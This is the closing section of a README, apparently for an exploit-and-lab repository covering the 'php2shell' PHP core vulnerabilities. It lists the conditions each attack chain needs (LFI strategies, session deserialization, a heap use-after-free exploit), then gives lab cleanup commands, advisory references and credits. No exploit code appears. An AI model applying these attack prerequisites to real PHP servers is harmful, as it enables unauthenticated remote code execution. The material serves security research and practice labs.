  - PHP version in the vulnerable range (see table above)
  - Strategy A: `post_max_size > memory_limit` + an LFI vulnerability
  - Strategy B: any body limit + an LFI vulnerability
  - Strategy C: matching offset profile
  - Deserialization: `php_serialize` handler + `php` handler mismatch + gadget class

  *Heap UAF chain (edb-52704.py):*
  - mod_php under Apache prefork, single worker
  - `memory_limit=8M`, `display_errors=1`, `session.use_strict_mode=0`
  - `session.upload_progress.enabled=On` (default)
  - Matching offset profile (auto-extracted or manual)

---

## Cleanup

```bash
# Stop SFI practice labs
cd labs
for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
  (cd $d && docker compose down)
done

# Stop the mod_php exploit lab
cd docker && docker compose down
```

---

## References

- **CVE-2026-109618** — [GHSA-w8hw-w9fx-j79w](https://github.com/advisories/GHSA-w8hw-w9fx-j79w) (CVSS v4.0 9.2)
- **CVE-2026-109619** — [GHSA-6wmf-4rv5-p3rp](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp) (CVSS v4.0 9.2)
- **OffSec Blog** — [php2shell: Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/)
- **Exploit-DB 52704** — [OffSec heap UAF exploit](https://www.exploit-db.com/exploits/52704)
- **Original Research** — [calif.io/php2shell](https://calif.io/php2shell) (Calif, OpenAI, Wiz)
- **Datadog Security Labs** — php2shell analysis
- **CrowdStrike** — php2shell threat analysis
- **Wiz** — php2shell cloud exposure analysis
- **OffSec Proving Grounds** — CVE-2026-109618 practice machine
- **php.net** — Emergency security release 2026-10-21 (8.2.35, 8.3.36, 8.4.27, 8.5.12)
- **VulnCheck** — [php2shell vulnerabilities analysis](https://www.vulncheck.com/blog/php2shell-vulnerabilities)
- **Zscaler** — [CVE-2026-109618 and CVE-2026-109619 analysis](https://www.zscaler.com/blogs/security-research/cve-2026-109618-and-cve-2026-109619-php-vulnerable-unauthenticated-rce)
- **Huntress** — Rapid response and detection guidance

---

## Credits

- **Original discovery:** Calif, OpenAI, and Wiz
- **EDB-52704 heap exploit:** 9bie and eness (adjusted by OffSec)
- **SFI chain, labs, detection tools:** [MomoRizza](https://github.com/MomoRizza)

---

## License

For authorized security testing and educational use only.
